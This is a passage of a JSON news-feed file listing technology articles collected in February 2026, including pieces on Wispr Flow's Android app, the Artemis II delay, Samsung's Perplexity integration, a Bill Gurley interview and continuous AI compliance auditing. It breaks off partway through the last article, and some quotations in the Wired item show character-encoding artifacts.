{
  "industry": "technology",
  "collected_at": "2026-02-23T10:34:06.623714+00:00",
  "hours": 24,
  "limit": 25,
  "count": 25,
  "items": [
    {
      "industry": "technology",
      "source": "TechCrunch",
      "title": "Wispr Flow launches an Android app for AI-powered dictation",
      "url": "https://techcrunch.com/2026/02/23/wispr-flow-launches-an-android-app-for-ai-powered-dictation/",
      "published": "2026-02-23T08:01:00+00:00",
      "summary": "AI-powered dictation startup Wispr Flow has launched its Android app today. The company released its app for Mac and Windows first, then launched on iOS in June 2025. On iOS, users could use Wispr Flow through a dedicated keyboard. On Android, the interface is a bit different, as you can access the dictionary through a [&#8230;]",
      "content_text": "AI-powered dictation startup Wispr Flow has launched its Android app today. The company released its app for Mac and Windows first, then launched on iOS in June 2025 . On iOS, users could use Wispr Flow through a dedicated keyboard. On Android, the interface is a bit different, as you can access the dictionary through a floating bubble. You can hold the bubble and dictate, or press once to start, and then press the close button to stop the process. Just like on other platforms, in addition to dictation, the app cleans up the filter words and also formats the text based on the context of the app and spoken content. “Android finally gave us the freedom to build the voice experience we always wanted. Only when the platform gets out of the way can we truly expect voice to replace typing on mobile,” Tanay Kothari, co-founder and CEO of the startup, said. The app can support translation in over 100 languages and can work across other apps. Along with the Android app release, Wispr Flow said that it has done an infrastructure rewrite that makes dictation 30% faster than before. While there are tons of AI-powered dictation apps available on desktop and iOS , Wispr Flow is one of the few available on Android with this launch, besides Typeless, which launched an app for the platform last month . What’s more, the company has also released a new model for Hinglish, a mix of Hindi and English, for people in India who speak in mix-coded way. Techcrunch event Boston, MA | June 9, 2026 “If you’re someone like me, English and Hindi weave together when I’m chatting with family and colleagues back home. This is one of those times when I just had to build something for me: the first voice model to actually support transcription in Hinglish instead of traditional Hindi script,” Kothari said. Image Credits: Wispr Flow The company noted that even with early rollout to select users, users have spoken over 1.3 million words in English in the last few days. Wispr Flow has been one of the more popular startups in the category of AI-powered dictation apps that have also attracted significant venture capital attention. In June, the startup raised $30 million in funding led by Menlo Ventures in June . Within a few months, in November, the company secured $25 million in a round led by Notable Capital. Wispr Flow has raised $81 million in total, with its last round valued at $700 million according to sources.",
      "cover_image_url": "https://techcrunch.com/wp-content/uploads/2026/02/Wispr-Flow-Android-hero.jpg?resize=1200,718"
    },
    {
      "industry": "technology",
      "source": "Wired",
      "title": "NASA Delays Launch of Artemis II Lunar Mission Once Again",
      "url": "https://www.wired.com/story/nasa-delays-artemis-ii-launch-again/",
      "published": "2026-02-23T00:42:06+00:00",
      "summary": "A failure in the helium flow of the SLS rocket has prompted NASA to delay the Artemis II moon mission. Rather than March 6, the launch is now targeted for April.",
      "content_text": "NASA has once again postponed the launch of Artemis II , the crewed lunar flyby mission , setting a new launch window for April. Although March 6 had been tentatively planned as the launch date, the US space agency revealed that a problem with the rocket has caused further delay. According to NASA administrator Jared Isaacman, the failure was due to an interruption in the helium flow in the interim cryogenic propulsion stage of the Space Launch System (SLS). The helium flow is essential for purging the engines and pressurizing the fuel tanks. This system had functioned correctly in the two dress rehearsals conducted this month, but the failure occurred during a routine operation. Due to the nature of the problem, NASA engineers will have to fix it from the Vehicle Assembly Building (VAB), so there's no way to proceed with the March launch window. The rocket is on its way back to the hangar. \"I understand people are disappointed by this development,\" the official stated on his X account. \"That disappointment is felt most by the team at NASA, who have been working tirelessly to prepare for this great endeavor. During the 1960s, when NASA achieved what most thought was impossible, and what has never been repeated since, there were many setbacks.\" Will Artemis II be able to embark on its mission in April? NASA reported that rapid preparations have allowed it to potentially preserve the April launch window in the event of a reversal. It all depends on what the data, the repair efforts, and how the schedule comes together in the coming days. Artemis II: The Setbacks The mission had its first launch window between February 6 and 11. However, during the wet dress rehearsal (WDR), which is a full rehearsal with fuel, the team detected small hydrogen leaks during refueling and some minor technical glitches. After analyzing the situation, NASA concluded that the risk was considerable and could endanger the lives of the astronauts, so it decided to postpone the launch. A second dress rehearsal, conducted on February 19, was successful. In a statement, the space agency explained that it loaded 700,000 gallons of liquid propellant with no leaks. â€œDuring the test, teamsÂ closelyÂ monitoredÂ liquid hydrogen fueling operations,Â whichÂ proved challenging duringÂ previousÂ tests.Â HydrogenÂ gasÂ concentrations remained under allowable limits, giving engineers confidence in new sealsÂ installed in anÂ interface used toÂ route fuel toÂ the rocket,â€� NASA said . At a subsequent press conference, mission representatives confirmed to the media that the new tentative liftoff date would be March 6. However, on February 20, the team failed to get helium to flow through the vehicle, a failure that also occurred during testing of the Artemis I mission. Isaacman noted that the cause could be due to a faulty filter, valve or connector plate. â€œThere are many differences between the 1960s and today, and expectations should rightfully be high after the time and expense invested in this program,â€� Isaacman said in his post. â€œI will say again, the President created Artemis as a program that will far surpass what America achieved during Apollo. We will return in the years ahead, we will build a Moon base, and undertake what should be continuous missions to and from the lunar environment.â€� When it eventually launches, the Orion capsule will travel farther than any other manned spacecraft during its 10-day mission, surpassing on the sixth day the record of 400,171 kilometers set by Apollo 13. The return will conclude with Orion's landing in the Pacific Ocean off the coast of San Diego, California. Although there will be no lunar landingâ€”that feat will fall to the Artemis III missionâ€”the second launch is of crucial importance. Its success will demonstrate that NASA has the technical capabilities to return to the moon and begin a new phase of space exploration. This story originally appeared in WIRED en EspaÃ±ol and has been translated from Spanish.",
      "cover_image_url": "https://media.wired.com/photos/699b9a09c0678ca26a9a6862/191:100/w_1280,c_limit/artemis.jpg"
    },
    {
      "industry": "technology",
      "source": "TechCrunch",
      "title": "Apple might take a new approach to announcing its next products",
      "url": "https://techcrunch.com/2026/02/22/apple-might-take-a-new-approach-to-announcing-its-next-products/",
      "published": "2026-02-22T23:08:08+00:00",
      "summary": "Apple has invited the tech press to a “special Apple experience” on March 4, but it might unfold a bit differently than the company's standard press event.",
      "content_text": "Apple has invited the tech press to a “special Apple experience” on March 4, but it might unfold a bit differently than the company’s standard press event. Bloomberg’s Mark Gurman reports that instead of announcing everything at a single keynote, Apple is planning a “three-day flurry of announcements” — presumably announced online, and culminating in the March 4 “experience” that will consist of be three events in New York, London, and Shanghai, where the press will be offered a chance to get hands-on with the upcoming products. Similarly, Daring Fireball’s John Gruber speculated that the experience could be “a hands-on thing with in-person demos.” Apple will reportedly be announcing at least five new products during that time, including a low-cost MacBook. Other reported possibilities: the iPhone 17e, an iPad Air with an M4 chip, a new entry-level iPad, and an upgraded MacBook Air and new MacBook Pro models. Gurman said all of those products are due this spring, but he sounded less certain about which ones will be announced when.",
      "cover_image_url": "https://techcrunch.com/wp-content/uploads/2026/01/iphone-17-air-pro-apple.jpg?resize=1200,800"
    },
    {
      "industry": "technology",
      "source": "TechCrunch",
      "title": "Can the creator economy stay afloat in a flood of AI slop?",
      "url": "https://techcrunch.com/2026/02/22/can-the-creator-economy-stay-afloat-in-a-flood-of-ai-slop/",
      "published": "2026-02-22T22:15:58+00:00",
      "summary": "On the latest episode of Equity, we debated what’s next for the creator economy, and whether there will be any room for the next generation of creators to stand out.",
      "content_text": "Online creators and their business models were on our mind this week after mega-popular YouTuber MrBeast announced that his company is buying fintech startup Step , followed by Hollywood studios sending a flurry of cease-and-desist letters to ByteDance over the launch of its new video generation model Seedance 2.0. Those seemingly unconnected headlines suggest a media landscape in the midst of transformative change, as popular YouTubers look to diversify their business models , with the threat and promise of increasingly powerful generative AI tools on the horizon. On the latest episode of TechCrunch’s Equity podcast , Kirsten Korosec, Rebecca Bellan, and I debated what’s next for the creator economy, and whether there will be any room for the next generation of creators to stand out. “What’s the next saturation point?” Kirsten wondered. “Not all of these folks can go out and spin off products. So then does the pool of successful creators just simply get smaller? Or will something else happen, technologically speaking, or a different medium that will allow them to find an audience to make money off of?” You can read a preview of our conversation, edited for length and clarity, below. Anthony: [The news] led our colleague Lauren to do this great piece talking about the creator business model in general , and this sense that they aren’t just relying on ad revenue anymore. I think it’s still a pretty big part of their business, but she broke down a number of the most popular YouTubers and noted that each of them is expanding — usually into e-commerce, but also into other revenue streams. Mr. Beast, for example, actually has this line of food products, including chocolate, that is making hundreds of millions of dollars and it was actually profitable for him in 2024, whereas his media business was losing money. All that was pretty wild to me. Techcrunch event Boston, MA | June 9, 2026 Kirsten: If Mr. Beast can’t be profitable with his media company, who can? To me, that was a stunning stat. I am not surprised that the whole ad revenue biz game is not working out necessarily for creators and influencers because it’s just reached a saturation point. I guess my big question is, what’s the next saturation point? Not all of these folks can go out and spin off products. So then does the pool of successful creators just simply get smaller? Or will something else happen, technologically speaking, or a different medium that will allow them to find an audience to make money off of? Rebecca: It’s interesting, there’s a lot of ways you can think about what else could happen, right? Maybe they’ll create digital twins of themselves and put their digital twins into a bunch of different situations that can make them [other kinds of] money. But again, going back to this not being surprising, these people are now celebrities, right? Someone told me on the phone recently that a lot of [the] younger generation, they don’t know our celebrities, they know TikTok celebrities. And we’ve seen celebrities for years pass off products and make money off of them, right? I used to watch Rachel [Ray], she was a celebrity chef and she sold her EVOO or her olive oil. We Slow Ventures on [Equity] sometime last year . They have a creator fund and basically what they’re doing is they’ve raised a VC fund to essentially back creators with their businesses, if they have maybe a niche following, maybe they’re really into woodworking and here’s their collection of chisels, I don’t know. I think it’s an interesting path forward and it’s something that we see as journalists: How do we also try to be creators and make a brand of ourselves that we could diversify our revenue. It sounds horrible to say it out loud like that. Anthony: I’m smiling, but it’s the smile of somebody whose soul is slowly turning into ash inside. So we took a break from talking about AI, but I will obligatorily bring AI back into the conversation. Obviously one of the other related developments over the past week or so is that ByteDance, which is the Chinese company that launched TikTok and is still an investor — we won’t get into all of that — they launched a new version of their model, Seedance 2.0, which at least initially was primarily only available to Chinese users. But you started to see people posting videos generated by Seedance, including this viral video of Brad Pitt fighting Tom Cruise. That prompted both this general conversation of: Is Hollywood doomed? And then more concretely, a bunch of Hollywood studios, including Netflix, sending ByteDance letters being like, “You cannot do this, you’re basically allowing all your users to generate videos using all of our IP, all of our movie stars.” And for a couple of days, there was no response at all from ByteDance, but then they did say, “Sorry, sorry, sorry, for some reason we launched this without any real guardrails, but we’re gonna do better in the future.” Kirsten: So the timing of this is just perfect because I happen to be editing a story right now that Rebecca wrote. It has nothing to do with Seedance, but it does have to do with AI and filmmaking . So I’m going to give a future ]rops to Rebecca for being timely about that. Rebecca, I know you have a lot to say on that, besides that Hollywood is upset. Is it more complicated than that? Rebecca: Yeah, definitely. I mean, tying this back to the creators thing, I think that a lot of people are going to be using these tools to produce all kinds of content and we’re just going to be absolutely flooded. And that’s going to be intense. But when we talk about, whether it’s creating films or ads or just content in general using AI video tools, I think there’s this tension between one, this is going to produce a whole lot of low effort slop versus two, it could also democratize access for a lot of people who don’t have funds or budgets or teams to share a lot of the stories that they want to tell. And also, if you’re a small business and you want to create a little shampoo ad — to be on the nose about it, because there’s a shampoo ad that’s going viral — or you sell coffee and you want to make a little ad for it, [this] could give you the tools to do that. Is that a bad thing? Is it not a bad thing? Do we need more content in the world? There’s a few avenues to walk down. Kirsten: Is it a bad thing, Anthony? Anthony: In terms of the creator side of it, my general feeling is [that] the response to a lot of this kind of slop — frankly, a lot of it is slop, and I think that’s going to continue to be the case — is going to be this valuing of authenticity. And so there is the opportunity for these big creators is be less about the idea of like, “I have digital twins of myself,” but [instead,] “No, I’m the real Mr. Beast, not the digital simulacra wandering around.” And I think it’s also telling that – of course, every social network has ups and downs, but that OpenAI’s Sora, from what I understand, had skyrocketed at the beginning and then has been struggling to hold on to users more recently, because there is a certain emptiness to the experience when you just feel like there’s not an authentic human being on the other side. But I think it’s also going to make the landscape much more challenging, both for the established creators to monetize […] and then I think it’s going to be especially hard for new creators because there’s just going to be so much more stuff. Trying to actually break out is going to become super difficult. VIDEO",
      "cover_image_url": "https://techcrunch.com/wp-content/uploads/2025/06/GettyImages-941290532.jpg?resize=1200,800"
    },
    {
      "industry": "technology",
      "source": "The Verge",
      "title": "Samsung is adding Perplexity to Galaxy AI",
      "url": "https://www.theverge.com/tech/882921/samsung-is-adding-perplexity-to-galaxy-ai",
      "published": "2026-02-22T22:15:30+00:00",
      "summary": "In addition to summoning Bixby or Gemini, Galaxy S26 users will be able to call on Perplexity by saying \"hey, Plex.\" The integration of Perplexity into Galaxy AI is just one element of the company's embrace of a \"multi-agent ecosystem.\" Often, people will use different AI agents for different tasks, depending on where their strengths [&#8230;]",
      "content_text": "In addition to summoning Bixby or Gemini , Galaxy S26 users will be able to call on Perplexity by saying “ hey, Plex .” The integration of Perplexity into Galaxy AI is just one element of the company’s embrace of a “multi-agent ecosystem.” Often, people will use different AI agents for different tasks, depending on where their strengths lie. So Samsung is opening up the ability to integrate different agents into the OS. Hey, Plex isn’t just some transparent version of the app baked into a Galaxy phone to quickly get answers to questions. Perplexity will have access to Samsung Notes, Clock, Gallery, Reminder, and Calendar, as well as select third-party apps, though which ones specifically Samsung didn’t say. Samsung seems to believe that people will increasingly use AI to interact with their phones. But, as we’ve learned, people can develop strong attachments to particular AIs. So the company is betting that giving people the freedom to put whatever agent they want at the heart of their phone will help differentiate them from competition like Apple and Google. Of course, Samsung’s next Unpacked event is just around the corner. I’m sure we’ll hear more about Galaxy AI and Samsung’s vision for a multi-agent future on the 25th .",
      "cover_image_url": "https://platform.theverge.com/wp-content/uploads/sites/2/2026/02/Samsung-Mobile-Galaxy-AI-Perplexity-AI-Agent-Expansion-of-Galaxy-AI_main1.jpg?quality=90&strip=all&crop=0,3.5026456994597,100,92.994708601081"
    },
    {
      "industry": "technology",
      "source": "The Verge",
      "title": "You need to listen to Laurie Spiegel’s masterpiece of early ambient music",
      "url": "https://www.theverge.com/entertainment/882915/laurie-spiegel-the-expanding-universe-review-masterpiece-ambient-music",
      "published": "2026-02-22T21:30:00+00:00",
      "summary": "I recently had the pleasure of interviewing Laurie Spiegel for the site. As preparation for the interview, I spent a lot of time over the last couple of weeks revisiting Spiegel's records, most notably The Expanding Universe, her 1980 masterpiece that blends synth experimentalism with early examples of what would eventually be called ambient music, [&#8230;]",
      "content_text": "I recently had the pleasure of interviewing Laurie Spiegel for the site. As preparation for the interview, I spent a lot of time over the last couple of weeks revisiting Spiegel’s records, most notably The Expanding Universe , her 1980 masterpiece that blends synth experimentalism with early examples of what would eventually be called ambient music , and algorithmic composition techniques. It’s a marvel that sounds both nostalgic and cutting-edge at the same time. Tracks like “Patchwork” and “A Folk Study” dabble in the sort of bouncy arpeggios that beg comparisons to The Who’s “Baba O’Riley,” while “Old Wave” and “East River Dawn” conjure early M83 or Boards of Canada. The palette she draws from is buzzing with life and timeless, rarely dating itself in the way her later (also excellent) record Unseen Worlds does, as it occasionally dabbles in FM bells. There are also slower forays into more typical ambient sounds like “Appalachian Grove II” or “The Unanswered Question,” whose melodies move at such a glacial pace that they can feel almost completely random at times. Tracks like these and “Music for Dance II” wouldn’t feel out of place on modern ambient Instagram or modular synth YouTube , scenes that obviously owe a lot to Spiegel’s pioneering works. While the vast majority of the tracks completely lack percussion, there are a few exceptions, most obviously the fast-paced and polyrhythmic “Drums.” But the standout to me is “Clockworks,” which ventures into the sort of proto-industrial grime and rattle you’d find on a Throbbing Gristle record or even a modern Trent Reznor score. The fact that it doesn’t appear to have been sampled (at least according to WhoSampled) and repurposed as the backbone of an underground hip-hop track is shocking to me. While The Expanding Universe doesn’t necessarily present a cohesive vision, it still feels like the singular expression of an artist at the height of their game. The 2012 reissue adds to Spiegel’s legacy by including over 100 minutes of additional material not on the original release. While the idea of 70s experimental synth music might scare off casual listeners, there is something inviting about a lot of the works on The Expanding Universe . Sure, some tracks, like the one-two punch of closers “Kepler’s Harmony of the Worlds” and “Wandering in Our Times,” aren’t afraid to sit for extended periods in dissonance and confrontational tones, but for the most part, Spiegel’s compositions are tuneful and approachable. Laurie Spiegel’s The Expanding Universe is available on Bandcamp, as well as most major streaming services, including Qobuz , Deezer , YouTube Music , Apple Music , and Spotify .",
      "cover_image_url": "https://platform.theverge.com/wp-content/uploads/sites/2/2026/02/the-expanding-universe.jpg?quality=90&strip=all&crop=0%2C16.921134198662%2C100%2C58.173356602676&w=1200"
    },
    {
      "industry": "technology",
      "source": "TechCrunch",
      "title": "Bill Gurley says that right now, the worst thing you can do for your career is play it safe",
      "url": "https://techcrunch.com/2026/02/22/bill-gurley-says-that-right-now-the-worst-thing-you-can-do-for-your-career-is-play-it-safe/",
      "published": "2026-02-22T21:08:50+00:00",
      "summary": "\"The number one thing is to get out of your head this ideal that gets passed around in the self-help world: 'go get a mentor,' and everyone runs out and cold calls someone that's ridiculously too high and unachievable, and it doesn't work.\"",
      "content_text": "For nearly three decades, Bill Gurley has been among of the most influential voices in Silicon Valley — a general partner at Benchmark whose early bets on companies like Uber, Zillow, and Stitch Fix helped define what modern venture capital looks like. Now, having moved to Austin and stepped back from active investing, the native Texan is channeling that same pattern-recognition instinct into something different: a book, a foundation, and a policy institute aimed at problems he thinks he can actually help solve. The book is Runnin’ Down a Dream — a nod to Tom Petty and also an argument that following your passion isn’t just romanticized career advice but a true competitive strategy, one that becomes only more urgent as AI rapidly reshapes the workforce. The foundation, which he’s calling the Running Down a Dream Foundation, will award 100 grants of $5,000 a year to people who need a financial cushion to make a leap they’ve been afraid to take. We caught up with Gurley to talk about all of it — including what he makes of the somewhat surreal reality that several of his former peers in tech now hold enormous sway in Washington, why he thinks the 996 grind culture many young founders have adopted is less alarming than it sounds, and what AI really means for your career. The following has been edited for length and clarity. Our full conversation with Gurley drops Tuesday on TC’s StrictlyVC Download podcast. Why write this book? I went through a phase where I was reading a lot of biographies — people from very different fields, different time windows — and I started noticing patterns the way I would notice patterns in a market evolving. I wrote them down. A couple years later I got invited to speak at the University of Texas, dusted off the notes, built a presentation. They posted it on YouTube, and James Clear — who wrote Atomic Habits — noticed and posted about it. That’s what got me thinking about a book. And when I went through my own process of moving away from venture and thinking about what I wanted to do next, it became obvious I didn’t want to write about VC or Uber or any of that. I wanted to do something that could have a bigger mission. Your research with Wharton found that roughly 60% of people would do things differently if they could start their careers over. That shocked you. Why? When we first ran it as a SurveyMonkey poll we got seven out of ten. When we did it more rigorously with Wharton, we got six out of ten. One of the things that strikes me is that we have a phrase in the book — life is a use it or lose it proposition — and when you’re young, it’s just hard to have that framing. It’s hard to fast-forward through all of your time and recognize how precious it is. Daniel Pink has done a lot of work on what he calls regrets of inaction — the thing that weighs on people most as they get older is the thing they didn’t try, the stone left unturned. That holds across multiple geographies and cultures. And I think a lot of well-intentioned parents feel more responsibility to create economic stability for their kids than to encourage them to truly explore their passion. Especially with AI out there, that may not have been the right call. Techcrunch event Boston, MA | June 9, 2026 Exploring your passion sounds like easier advice for people who have financial runway. What do you say to someone working paycheck to paycheck? A few things. First, the book profiles people who started on the very bottom rung and climbed to the top — [celebrity hairstylist and entrepreneur] Jen Atkins moved to LA with $200 in her pocket. There’s nothing in the book that says you need to start anywhere other than right at the beginning. Second, if you’re living paycheck to paycheck, I wouldn’t encourage you to quit. I’d encourage you to use your free time to build a little document on your phone about what your thing might be. Learn. Prepare to jump before you jump. And third — this is why I’m launching the foundation. The last page of the book talks about it: we’re going to give 100 grants a year of $5,000 to people who are in exactly that position, who can convince us in an application that they’ve thought long and hard about where they want to go but need a little help getting there. You’ve been outspoken for years about regulatory capture — the idea that big companies use regulation to entrench themselves. I gave a speech on regulatory capture a few years back — it was at the All-In Summit — and at the time I said I had a fear that the AI companies would try to use regulation to protect themselves. I think that’s happening now. The flip side is that there are legitimate questions: Jonathan Haidt’s book Anxious Generation has been on the bestseller list for almost two years, arguing social media has been really bad for children, with academic research to back it up. People would say we should have gotten in front of social media and need to do it with AI. The problem is that the people begging for regulation the most in AI are the actual companies themselves, and that makes me skeptical. There’s also the global dimension — if US AI gets entangled in state-by-state regulation and Chinese models are running free, we’re going to paint ourselves in red tape. I always ask people: what are your favorite five regulations of all time, and how were they successful? Do you have any confidence that people at the state level in a random state know how to write good AI regulation that will actually work? It’s a little surreal that several prominent figures from your world now hold enormous influence in Washington. What do you make of that? It’s very ironic. If you go back and watch that regulatory capture talk, who would have thought a few years later David Sacks would actually be [special advisor for AI and crypto in the White House]? Back in 2018, Mike Moritz of Sequoia wrote in the FT that Americans would lose to China if they didn’t start working harder . It was controversial at the time, but a lot of young founders here seem to have since embraced a punishing work culture — the 996 ethos. What are your thoughts about what’s happening? I kind of love it, honestly. I think Silicon Valley got really lazy during COVID — people weren’t coming into the office, the culture got soft in a way I hadn’t seen in all my years there. And I’ve been to China six times. I know what Michael Moritz was describing when he said we’re going to lose not because they’re smarter but because they have a better work ethic. But here’s the thing: if you study successful people across a lot of fields, we think it’s wonderful when an athlete practices 12 hours a day or when an artist works obsessively on their craft. Nobody says Jordan didn’t have work-life balance. We just don’t extend the same logic to building a company. If those founders love what they’re doing that much, and they feel like this is the moment to go hard, that’s actually precisely the point of the book: find the thing that makes you feel that way. You talk about mentorship in the book. What makes a great mentor relationship and how do people find one? The number one thing is to get out of your head this ideal that gets passed around in the self-help world: ‘go get a mentor,’ and everyone runs out and cold calls someone that’s ridiculously too high and unachievable, and it doesn’t work. For all those people that are really out of reach right now, I call them aspirational mentors — create a persona of them, just like I was talking about with the dream job folder. Get clips of all the books they’ve written, podcasts they’ve done, interviews they’ve done, and study them. You can learn a lot from people without talking to them directly, especially in the modern age. And then for your real mentors, go two levels down from where you thought you were going to aim. Discover somebody — tools like LinkedIn make this so easy — and be the first person to ever call them and ask them to be a mentor, because they’ll be flattered. They’ll be flattered that you knew who they were. Imagine anyone getting their first call to be a mentor. It’s a great feeling. You’re going to have way more success with that interaction than shooting too high. I’ll tell you a funny story: I started getting so many calls from people who wanted to break into venture that I wrote a three-page PDF called “So You Want to Be a VC,” and hidden in the third page was basically — go do X, go do Y, go do Z, come back and tell me how that went. The number of people that actually ended up talking to me after getting that document was a fraction of the number I sent it to. It’s funny how much it thinned when you gave them a little homework to do. You started working on this book before the impacts of AI became clearer. Does that at all change how people should think about their careers? If you’re following the traditional path — going through the career center at your university, signing up on a list, waiting for a recruiter to sit through 30 people in 20-minute slots — you look like a cog. You look mass-produced. For that group, AI looks frightening, and maybe it should. But if you are blazing your own trail, using the techniques in the book, becoming what I call a candidate of one — someone whose path looks completely unique because you’ve built it intentionally — then every tool in this book is amplified by AI. Learning has never been easier than right now, in the entire history of the world. If you’re running toward it, if you’re becoming the most AI-aware person in your field, this thing is nothing but a superpower.",
      "cover_image_url": "https://techcrunch.com/wp-content/uploads/2026/02/GettyImages-1249266599.jpg?resize=1200,800"
    },
    {
      "industry": "technology",
      "source": "VentureBeat",
      "title": "Shadow mode, drift alerts and audit logs: Inside the modern audit loop",
      "url": "https://venturebeat.com/orchestration/shadow-mode-drift-alerts-and-audit-logs-inside-the-modern-audit-loop",
      "published": "2026-02-22T19:00:00+00:00",
      "summary": "<p>Traditional software governance often uses static compliance checklists, quarterly audits and after-the-fact reviews. But this method can&#x27;t keep up with <a href=\"https://venturebeat.com/infrastructure/nvidia-groq-and-the-limestone-race-to-real-time-ai-why-enterprises-win-or\">AI systems</a> that change in real time. A machine learning (ML) model might retrain or drift between quarterly operational syncs. This means that, by the time an issue is discovered, hundreds of bad decisions could already have been made. This can be almost impossible to untangle. </p><p>In the fast-paced world of AI, governance must be inline, not an after-the-fact compliance review. In other words, organizations must adopt what I call an “audit loop&quot;: A continuous, integrated compliance process that operates in real-time alongside AI development and deployment, without halting innovation. </p><p>This article explains how to implement such continuous AI compliance through shadow mode rollouts, drift and misuse monitoring and audit logs engineered for direct legal defensibility.</p><h2>From reactive checks to an inline “audit loop”</h2><p>When systems moved at the speed of people, it made sense to do compliance checks every so often. But AI doesn&#x27;t wait for the next review meeting. The change to an inline audit loop means audits will no longer occur just once in a while; they happen all the time. Compliance and risk management should be &quot;baked in&quot; to the AI lifecycle from development to production, rather than just post-deployment. This means establishing live metrics and guardrails that monitor AI behavior as it occurs and raise red flags as soon as something seems off. </p><p>For instance, teams can set up drift detectors that automatically alert when a model&#x27;s predictions go off course from the training distribution, or when confidence scores fall below acceptable levels. Governance is no longer just a set of quarterly snapshots; it&#x27;s a streaming process with alerts that go off in real time when a system goes outside of its defined confidence bands.</p><p>Cultural shift is e<!-- -->qually important: Compliance teams must act less like after-the-fact auditors and more like AI co-pilots. In practice, this might mean compliance and <a href=\"https://venturebeat.com/orchestration/ai-agents-turned-super-bowl-viewers-into-one-high-iq-team-now-imagine-this\">AI engineers working together</a> to define policy guardrails and continuously monitor key indicators. With the right tools and mindset, real-time AI governance can “nudge” and intervene early, helping teams course-correct without slowing down innovation. </p><p>In fact, when done well, continuous governance builds trust rather than friction, providing shared visibility into AI operations for both builders and regulators, instead of unpleasant surprises after deployment. The following strategies illustrate how to achieve this balance.</p><h2>Shadow mode rollouts: Testing compliance safely</h2><p>One effective framework for continuous AI compliance is “shadow mode” deployments with new models or agent features. This means a new AI system is deployed in parallel with the existing system, receiving real production inputs but not influencing real decisions or user-facing outputs. The legacy model or process continues to handle decisions, while the new AI’s outputs are captured only for analysis. This provides a safe sandbox to vet the AI’s behavior under real conditions. </p><p>According to global law firm <a href=\"https://www.morganlewis.com/blogs/sourcingatmorganlewis/2025/10/contracts-for-ai-agent-development-and-implementation-part-2-governance-and-accountability\"><u>Morgan Lewis</u></a>: “Shadow-mode operation requires the AI to run in parallel without influencing live decisions until its performance is validated,” giving organizations a safe environment to test changes. </p><p>Teams can discover problems early by comparing the shadow model&#x27;s decisions to expectat",
      "content_text": "<p>Traditional software governance often uses static compliance checklists, quarterly audits and after-the-fact reviews. But this method can&#x27;t keep up with <a href=\"https://venturebeat.com/infrastructure/nvidia-groq-and-the-limestone-race-to-real-time-ai-why-enterprises-win-or\">AI systems</a> that change in real time. A machine learning (ML) model might retrain or drift between quarterly operational syncs. This means that, by the time an issue is discovered, hundreds of bad decisions could already have been made. This can be almost impossible to untangle. </p><p>In the fast-paced world of AI, governance must be inline, not an after-the-fact compliance review. In other words, organizations must adopt what I call an “audit loop&quot;: A continuous, integrated compliance process that operates in real-time alongside AI development and deployment, without halting innovation. </p><p>This article explains how to implement such continuous AI compliance through shadow mode rollouts, drift and misuse monitoring and audit logs engineered for direct legal defensibility.</p><h2>From reactive checks to an inline “audit loop”</h2><p>When systems moved at the speed of people, it made sense to do compliance checks every so often. But AI doesn&#x27;t wait for the next review meeting. The change to an inline audit loop means audits will no longer occur just once in a while; they happen all the time. Compliance and risk management should be &quot;baked in&quot; to the AI lifecycle from development to production, rather than just post-deployment. This means establishing live metrics and guardrails that monitor AI behavior as it occurs and raise red flags as soon as something seems off. </p><p>For instance, teams can set up drift detectors that automatically alert when a model&#x27;s predictions go off course from the training distribution, or when confidence scores fall below acceptable levels. Governance is no longer just a set of quarterly snapshots; it&#x27;s a streaming process with alerts that go off in real time when a system goes outside of its defined confidence bands.</p><p>Cultural shift is e<!-- -->qually important: Compliance teams must act less like after-the-fact auditors and more like AI co-pilots. In practice, this might mean compliance and <a href=\"https://venturebeat.com/orchestration/ai-agents-turned-super-bowl-viewers-into-one-high-iq-team-now-imagine-this\">AI engineers working together</a> to define policy guardrails and continuously monitor key indicators. With the right tools and mindset, real-time AI governance can “nudge” and intervene early, helping teams course-correct without slowing down innovation. </p><p>In fact, when done well, continuous governance builds trust rather than friction, providing shared visibility into AI operations for both builders and regulators, instead of unpleasant surprises after deployment. The following strategies illustrate how to achieve this balance.</p><h2>Shadow mode rollouts: Testing compliance safely</h2><p>One effective framework for continuous AI compliance is “shadow mode” deployments with new models or agent features. This means a new AI system is deployed in parallel with the existing system, receiving real production inputs but not influencing real decisions or user-facing outputs. The legacy model or process continues to handle decisions, while the new AI’s outputs are captured only for analysis. This provides a safe sandbox to vet the AI’s behavior under real conditions. </p><p>According to global law firm <a href=\"https://www.morganlewis.com/blogs/sourcingatmorganlewis/2025/10/contracts-for-ai-agent-development-and-implementation-part-2-governance-and-accountability\"><u>Morgan Lewis</u></a>: “Shadow-mode operation requires the AI to run in parallel without influencing live decisions until its performance is validated,” giving organizations a safe environment to test changes. </p><p>Teams can discover problems early by comparing the shadow model&#x27;s decisions to expectations (the current model&#x27;s decisions). For instance, when a model is running in shadow mode, they can check to see if its inputs and predictions differ from those of the current production model or the patterns seen in training. Sudden changes could indicate bugs in the data pipeline, unexpected bias or drops in performance. </p><p>In short, shadow mode is a way to check compliance in real time: It ensures that the model handles inputs correctly and meets policy standards (accuracy, fairness) before it is fully released. One AI security framework showed how this method worked: Teams first ran AI in shadow mode (AI makes suggestions but doesn&#x27;t act on its own), then compared AI and human inputs to determine trust. They only let the AI suggest actions with human approval after it was reliable. </p><p>For instance,<!-- --> Prophet Security eventually let the AI make low-risk decisions on its own. Using phased rollouts gives people confidence that an <a href=\"https://venturebeat.com/orchestration/the-era-of-agentic-ai-demands-a-data-constitution-not-better-prompts\">AI system</a> meets requirements and works as expected, without putting production or customers at risk during testing. </p><h2>Real-time drift and misuse detection</h2><p>Even after an AI model is fully deployed, the compliance job is never &quot;done.&quot; Over time, AI systems can drift, meaning that their performance or outputs change due to new data patterns, model retraining or bad inputs. They can also be misused or lead to results that go against policy (for example, inappropriate content or biased decisions) in unexpected ways. </p><p>To remain compliant, teams must set up monitoring signals and processes to catch these issues as they happen. In SLA monitoring, they may only check for uptime or latency. In AI monitoring, however, the system must be able to tell when outputs are not what they should be. For example, if a model suddenly starts giving biased or harmful results. This means setting &quot;confidence bands&quot; or quantitative limits for how a model should behave and setting automatic alerts when those limits are crossed.</p><p>Some signals to monitor include:</p><ul><li><p><b>Data or concept drift:</b> When input data distributions change significantly or model predictions diverge from training-time patterns. For example, a model’s accuracy on certain segments might drop as the incoming data shifts, a sign to investigate and possibly retrain.</p></li><li><p><b>Anomalous or harmful outputs:</b> When outputs trigger policy violations or ethical red flags. An AI content filter might flag if a generative model produces disallowed content, or a bias monitor might detect if decisions for a protected group begin to skew negatively. Contracts for AI services now often require vendors to detect and address such noncompliant results promptly.</p></li><li><p><b>User misuse patterns:</b> When unusual usage behavior 